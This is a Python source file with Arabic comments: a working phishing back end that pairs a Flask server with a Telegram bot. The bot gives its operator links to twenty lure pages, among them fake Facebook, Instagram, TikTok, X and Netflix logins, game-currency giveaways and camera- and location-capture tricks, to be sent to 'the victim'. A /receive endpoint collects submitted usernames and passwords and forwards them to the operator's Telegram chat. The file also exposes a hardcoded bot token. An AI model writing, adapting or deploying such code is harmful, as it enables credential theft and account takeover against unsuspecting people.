import os
import telebot
from flask import Flask, request, jsonify
from flask_cors import CORS

# --- إعدادات الهوية والحقوق ---
TOKEN = '7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM'
ADMIN_ID = 6829017835
MY_TITLE = "الجنرال"
# استبدل هذا الرابط برابط الـ Static Site الذي سيعطيك إياه ريندر لصفحات الـ HTML
BASE_PAGES_URL = "https://generals-pages.onrender.com" 

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
CORS(app)

# --- دالة لوحة التحكم (الـ 20 زر) ---
def get_general_dashboard():
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    
    # قائمة الأزرار مع مسمياتها والكود الخاص بكل ملف HTML
    buttons = [
        ("🔹 فيسبوك (أصلي)", "fb_orig"), ("🔸 إنستغرام (هدية)", "ig_gift"),
        ("🔹 تيك توك (عملات)", "tk_coins"), ("🔸 سناب شات (سنابات)", "snap_gift"),
        ("🔹 ببجي (6000 UC)", "pubg_uc"), ("🔸 فري فاير (جواهر)", "ff_diam"),
        ("🔹 واتساب (تحديث)", "wa_update"), ("🔸 تلغرام (بريميوم)", "tg_prem"),
        ("🔹 كلاش أوف كلانس", "coc_gems"), ("🔸 لودو ستار (ذهب)", "ludo_gold"),
        ("🔹 نمط اختراق موقع", "tool_loc"), ("🔸 نمط سحب كاميرا", "tool_cam"),
        ("🔹 فيسبوك (لايت)", "fb_lite"), ("🔸 إنستغرام (توثيق)", "ig_verify"),
        ("🔹 تيك توك (متابعين)", "tk_fans"), ("🔸 تويتر / X", "x_login"),
        ("🔹 نتفليكس (مجاني)", "ntfx_acc"), ("🔸 سبوتيفاي (اشتراك)", "spot_prem"),
        ("🔹 طلب موقع (تمويه)", "fake_map"), ("🔸 فحص أمان (تمويه)", "sec_check")
    ]
    
    btns = [telebot.types.InlineKeyboardButton(text=name, callback_data=f"link_{code}") for name, code in buttons]
    kb.add(*btns)
    return kb

# --- استقبال البيانات (الصيد) ---
@app.route('/receive', methods=['POST'])
def receive():
    data = request.json
    platform = data.get('platform', 'غير معروف')
    user = data.get('u')
    password = data.get('p')
    
    if user and password:
        msg = f"🎖️ **تم اصطياد هدف جديد يا {MY_TITLE}** 🎖️\n"
        msg += f"━━━━━━━━━━━━━━━\n"
        msg += f"🌐 **المنصة:** {platform}\n"
        msg += f"👤 **المستخدم:** `{user}`\n"
        msg += f"🔑 **كلمة السر:** `{password}`\n"
        msg += f"━━━━━━━━━━━━━━━\n"
        msg += f"✅ **الحقوق:** بواسطة بوت {MY_TITLE}"
        bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
    return jsonify({"status": "ok"}), 200

# --- رسالة الترحيب والأوامر ---
@bot.message_handler(commands=['start'])
def start(m):
    if m.from_user.id == ADMIN_ID:
        welcome_msg = (
            f"🎖️ **أهلاً بك يا {MY_TITLE} في مركز القيادة**\n\n"
            f"هذا البوت مخصص لإدارة هجماتك وجلب روابط الصيد.\n"
            f"لقد تم ربط الـ 20 قسماً بقاعدتك بنجاح.\n\n"
            f"📢 **تعليمات:** اضغط على الزر المطلوب وسأعطيك الرابط المباشر لإرساله للضحية."
        )
        bot.send_message(m.chat.id, welcome_msg, reply_markup=get_general_dashboard(), parse_mode='Markdown')

# --- معالجة الضغط على الأزرار ---
@bot.callback_query_handler(func=lambda c: c.data.startswith("link_"))
def handle_links(c):
    page_code = c.data.replace("link_", "")
    final_link = f"{BASE_PAGES_URL}/{page_code}.html"
    
    response_msg = (
        f"🔗 **رابط الهجوم الجاهز للقسم ({page_code}):**\n\n"
        f"`{final_link}`\n\n"
        f"⚠️ **ملاحظة:** انسخ الرابط وأرسله للهدف."
    )
    bot.answer_callback_query(c.id, "تم توليد الرابط بنجاح ✅")
    bot.send_message(c.message.chat.id, response_msg, parse_mode='Markdown')

if __name__ == "__main__":
    import threading
    threading.Thread(target=bot.infinity_polling).start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
